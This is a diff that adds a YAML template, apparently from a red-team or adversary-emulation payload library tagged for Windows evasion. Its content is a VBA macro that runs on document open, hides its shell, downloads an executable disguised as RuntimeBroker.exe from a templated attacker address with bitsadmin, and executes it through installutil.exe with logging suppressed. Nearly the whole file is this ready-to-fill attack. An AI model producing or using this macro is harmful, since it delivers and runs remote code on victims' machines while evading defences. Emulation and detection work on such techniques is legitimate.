@@ -1,0 +1,22 @@
+---
+metadata:
+  filename: "installutil-vba-bitsadmin.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-30"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  Function RunCommand(cmd As String) As Long
+      RunCommand = Shell(cmd, vbHide)
+  End Function
+
+  Sub AutoOpen()
+      Dim myURL As String
+      Dim LocalFilePath As String
+
+      myURL = "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/RuntimeBroker.exe"
+      LocalFilePath = "{{ delivery_path_windows }}\RuntimeBroker.exe"
+
+      RunCommand "cmd.exe /c bitsadmin /transfer myJob /download /priority normal " & myURL & " " & LocalFilePath
+      RunCommand "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U " & LocalFilePath
+  End Sub
